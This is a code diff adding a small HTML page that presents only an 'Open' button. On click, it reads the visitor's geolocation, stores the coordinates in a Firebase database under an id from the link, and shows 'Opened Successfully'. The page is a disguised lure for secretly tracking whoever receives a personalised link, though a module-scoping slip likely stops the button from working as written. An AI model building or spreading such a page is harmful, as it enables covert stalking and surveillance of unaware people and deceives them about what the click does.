@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Open</title>
+</head>
+<body>
+
+<button onclick="getLocation()">Open</button>
+
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "YOUR_KEY",
+  authDomain: "YOUR_PROJECT.firebaseapp.com",
+  databaseURL: "https://YOUR_PROJECT.firebaseio.com",
+  projectId: "YOUR_PROJECT",
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+function getLocation() {
+  navigator.geolocation.getCurrentPosition((position) => {
+    const id = new URLSearchParams(window.location.search).get("id");
+
+    set(ref(db, "locations/" + id), {
+      lat: position.coords.latitude,
+      lng: position.coords.longitude
+    });
+
+    alert("Opened Successfully");
+  });
+}
+</script>
+
+</body>
+</html>
